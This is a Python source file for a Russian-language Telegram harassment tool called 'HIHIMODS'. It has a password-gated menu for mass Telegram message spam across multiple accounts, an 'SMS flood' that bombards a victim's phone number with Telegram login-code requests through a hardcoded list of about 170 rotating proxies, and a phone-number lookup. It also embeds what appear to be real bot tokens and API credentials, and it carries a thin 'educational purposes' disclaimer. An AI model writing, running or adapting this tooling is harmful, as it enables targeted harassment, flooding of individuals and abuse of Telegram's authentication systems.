import os
import sys
import time
import json
import random
import string
import asyncio
import threading
import urllib.request
from datetime import datetime
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs
from fake_useragent import UserAgent
import requests
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import ReportPeerRequest
from telethon.tl.types import (
    InputReportReasonSpam,
    InputReportReasonViolence,
    InputReportReasonPornography,
    InputReportReasonChildAbuse,
    InputReportReasonOther
)
import aiohttp
import faker
from tqdm import tqdm
from termcolor import colored
import pyfiglet

ACCOUNTS_FILE = 'hihimods_accounts.json'
LOG_BOT = '7751277865:AAFsuYp30Agn0QBcrz691zmqigX_GhMUqWQ'
LOG_REC = 'YOUR_CHAT_ID'
API_ID = 26694251
API_HASH = '5b041e7b70b74c095435be2b74c02abf'
PASSWORD = "@hihimods"
TELEGRAM_CHANNEL = "https://t.me/hihimods"
AUTHOR = "@hihimods"

class HIHIMODS:
    def __init__(self):
        self.ua = UserAgent()
        self.fake = faker.Faker('ru_RU')
        self.proxies_list = self._load_proxies()
        self.session = requests.Session()
        self.accounts = []
        self.flood_urls = self._load_flood_urls()
        
    def _load_proxies(self):
    return [
        '8.218.149.193:80', '47.57.233.126:80', '47.243.70.197:80',
        '8.222.193.208:80', '144.24.85.158:80', '47.245.115.6:80',
        '47.245.114.163:80', '45.4.55.10:40486', '103.52.37.1:4145',
        '200.34.227.204:4153', '190.109.74.1:33633', '200.54.221.202:4145',
        '36.67.66.202:5678', '168.121.139.199:4145', '101.255.117.2:51122',
        '45.70.0.250:4145', '78.159.199.217:1080', '67.206.213.202:4145',
        '14.161.48.4:4153', '119.10.179.33:5430', '109.238.222.1:4153',
        '103.232.64.226:4145', '183.88.212.247:1080', '116.58.227.197:4145',
        '1.20.97.181:34102', '103.47.93.214:1080', '89.25.23.211:4153',
        '185.43.249.132:39316', '188.255.209.149:1080', '178.216.2.229:1488',
        '92.51.73.14:4153', '109.200.156.2:4153', '89.237.33.193:51549',
        '211.20.145.204:4153', '45.249.79.185:3629', '208.113.223.164:21829',
        '62.133.136.75:4153', '46.99.135.154:4153', '1.20.198.254:4153',
        '196.6.234.140:4153', '118.70.196.124:4145', '185.34.22.225:46169',
        '103.47.93.199:1080', '222.129.34.122:57114', '92.247.127.249:4153',
        '186.150.207.141:1080', '202.144.201.197:43870', '103.106.32.105:31110',
        '200.85.137.46:4153', '116.58.254.9:4145', '101.51.141.122:4153',
        '83.69.125.126:4145', '187.62.88.9:4153', '122.54.134.176:4145',
        '170.0.203.11:1080', '187.4.165.90:4153', '159.224.243.185:61303',
        '103.15.242.216:55492', '187.216.81.183:37640', '176.197.100.134:3629',
        '101.51.105.41:4145', '46.13.11.82:4153', '103.221.254.125:40781',
        '177.139.130.157:4153', '1.10.189.133:50855', '69.70.59.54:4153',
        '83.103.195.183:4145', '190.109.168.241:42732', '103.76.20.155:43818',
        '84.47.226.66:4145', '1.186.60.25:4153', '93.167.67.69:4145',
        '202.51.112.22:5430', '213.6.204.153:42820', '184.178.172.14:4145',
        '217.171.62.42:4153', '121.13.229.213:61401', '101.255.140.101:1081',
        '78.189.64.42:4145', '187.11.232.71:4153', '190.184.201.146:32606',
        '195.34.221.81:4153', '200.29.176.174:4145', '103.68.35.162:4145',
        '194.135.97.126:4145', '167.172.123.221:9200', '200.218.242.89:4153',
        '190.7.141.66:40225', '186.103.154.235:4153', '118.174.196.250:4153',
        '213.136.89.190:52010', '217.25.221.60:4145', '50.192.195.69:39792',
        '180.211.162.114:44923', '179.1.1.11:4145', '41.162.94.52:30022',
        '103.211.11.13:52616', '103.209.65.12:6667', '101.51.121.29:4153',
        '190.13.82.242:4153', '103.240.33.185:8291', '202.51.100.33:5430',
        '201.220.128.92:3000', '177.11.75.18:51327', '62.122.201.170:31871',
        '79.164.171.32:50059', '202.124.46.97:4145', '79.132.205.34:61731',
        '217.29.18.206:4145', '222.217.68.17:35165', '105.29.95.34:4153',
        '103.226.143.254:1080', '119.82.251.250:31678', '45.232.226.137:52104',
        '195.69.218.198:60687', '155.133.83.161:58351', '213.108.216.59:1080',
        '178.165.91.245:3629', '124.158.150.205:4145', '36.72.118.156:4145',
        '177.93.79.18:4145', '103.47.94.97:1080', '78.140.7.239:40009',
        '187.19.150.221:80', '103.192.156.171:4145', '36.67.27.189:49524',
        '188.136.167.33:4145', '91.226.5.245:36604', '78.90.81.184:42636',
        '189.52.165.134:1080', '81.183.253.34:4145', '95.154.104.147:31387',
        '220.133.209.253:4145', '182.52.108.104:14153', '195.93.173.24:9050',
        '170.244.64.129:31476', '117.102.124.234:4145', '190.210.3.210:1080',
        '182.253.142.11:4145', '176.98.156.64:4145', '210.48.139.228:4145',
        '177.39.218.70:4153', '112.78.134.229:41517', '119.46.2.245:4145',
        '103.212.94.253:41363', '190.109.72.41:33633', '103.94.133.94:4153',
        '190.151.94.2:56093', '190.167.220.7:4153', '94.136.154.53:60030',
        '103.206.253.59:53934', '69.163.160.185:29802', '213.6.221.162:5678',
        '96.9.86.70:53304', '202.182.54.186:4145', '192.140.42.83:59057',
        '138.121.198.90:42494', '190.121.142.166:4153', '190.0.242.217:51327',
        '103.35.108.145:4145', '82.114.83.238:4153', '195.22.253.235:4145',
        '91.219.100.72:4153', '212.3.109.7:4145', '45.7.177.226:39867',
        '202.5.37.241:49151', '195.9.89.66:3629', '190.186.1.46:33567',
        '69.163.161.118:20243', '103.206.253.120:4153'
    ]

    def _load_flood_urls(self):
        return [
            'https://oauth.telegram.org/auth/request?bot_id=1852523856',
            'https://oauth.telegram.org/auth/request',
            'https://my.telegram.org/auth/send_password',
            'https://translations.telegram.org/auth/request',
            'https://oauth.telegram.org/auth?bot_id=5444323279',
            'https://oauth.telegram.org/auth?bot_id=1199558236',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146',
            'https://oauth.telegram.org/auth/request?bot_id=466141824',
            'https://oauth.telegram.org/auth/request?bot_id=5463728243',
            'https://oauth.telegram.org/auth/request?bot_id=1733143901',
            'https://oauth.telegram.org/auth/request?bot_id=319709511',
            'https://oauth.telegram.org/auth/request?bot_id=1803424014',
            'https://oauth.telegram.org/auth/request?bot_id=210944655'
        ]

    def print_logo(self):
        logo = pyfiglet.figlet_format("HIHIMODS", font="slant")
        colored_logo = colored(logo, 'cyan')
        print(colored_logo)
        print(colored("="*50, 'yellow'))
        print(colored(f"Author: {AUTHOR}", 'green'))
        print(colored(f"Channel: {TELEGRAM_CHANNEL}", 'green'))
        print(colored("="*50, 'yellow'))
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def check_password(self):
        password = input(colored("Введите пароль: ", 'yellow'))
        if password != PASSWORD:
            print(colored("Неверный пароль! Доступ запрещен.", 'red'))
            sys.exit()
        print(colored("Доступ разрешен. Запуск HIHIMODS...", 'green'))
        time.sleep(1)
        self.clear_screen()

    async def spam_tg(self):
        async def send_msgs(recipient, message, count, client):
            try:
                for i in range(count):
                    await client.send_message(recipient, message)
                    print(f"Отправлено {i+1}/{count}")
                    await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Ошибка: {e}")

        print(colored("\nTelegram Spam", 'cyan'))
        recipient = input("Получатель (@username или номер): ")
        message = input("Текст сообщения: ")
        count = int(input("Количество: "))
        
        if not self.accounts:
            print("Нет аккаунтов! Добавьте через меню.")
            return
            
        tasks = []
        for acc in self.accounts:
            tasks.append(send_msgs(recipient, message, count, acc['client']))
        
        await asyncio.gather(*tasks)
        print(colored("Спам завершен!", 'green'))

    async def flood_codami(self):
        print(colored("\nFlood Codami", 'cyan'))
        number = input("Номер телефона: ")
        count = int(input("Количество запросов: "))
        
        success = 0
        for _ in range(count):
            for url in self.flood_urls:
                try:
                    proxy = random.choice(self.proxies_list)
                    proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                    headers = {'User-Agent': self.ua.random}
                    response = requests.post(url, data={'phone': number}, headers=headers, proxies=proxies, timeout=10)
                    if response.status_code == 200:
                        success += 1
                        print(f"[{success}] Отправлено на {url} через {proxy}")
                except Exception as e:
                    print(f"Ошибка с прокси {proxy}: {e}")
                    continue
        print(colored(f"Успешно отправлено: {success}", 'green'))

    def probiv_po_nomeru(self):
        print(colored("\nПробив по номеру", 'cyan'))
        number = input("Введите номер: ")
        
        try:
            proxy = random.choice(self.proxies_list)
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            url = f"https://htmlweb.ru/geo/api.php?json&telcod={number}"
            response = requests.get(url, proxies=proxies)
            data = response.json()
            print(colored("\nРезультаты:", 'yellow'))
            print(f"Страна: {data.get('country', {}).get('name', 'N/A')}")
            print(f"Регион: {data.get('region', {}).get('name', 'N/A')}")
            print(f"Оператор: {data.get('0', {}).get('oper', 'N/A')}")
        except Exception as e:
            print(colored(f"Ошибка: {e}", 'red'))

    async def run(self):
        self.clear_screen()
        print(colored("""
        ⚠️ Дисклеймер:
        Этот инструмент предназначен только для образовательных целей.
        Используйте на свой страх и риск.
        """, 'yellow'))
        time.sleep(2)
        
        self.print_logo()
        self.check_password()
        
        while True:
            self.clear_screen()
            self.print_logo()
            print(colored("\nГлавное меню:", 'cyan'))
            print(colored("[1] Telegram спам", 'magenta'))
            print(colored("[2] SMS флуд", 'magenta'))
            print(colored("[3] Пробив по номеру", 'magenta'))
            print(colored("[0] Выход", 'red'))
            
            choice = input(colored("\nВыберите: ", 'yellow'))
            
            if choice == '1':
                await self.spam_tg()
            elif choice == '2':
                await self.flood_codami()
            elif choice == '3':
                self.probiv_po_nomeru()
            elif choice == '0':
                print(colored("Выход...", 'red'))
                break
            else:
                print(colored("Неверный выбор!", 'red'))
            
            input(colored("\nНажмите Enter чтобы продолжить...", 'cyan'))

if __name__ == "__main__":
    tool = HIHIMODS()
    try:
        asyncio.run(tool.run())
    except KeyboardInterrupt:
        print(colored("\nРабота завершена", 'red'))
    except Exception as e:
        print(colored(f"\nОшибка: {e}", 'red'))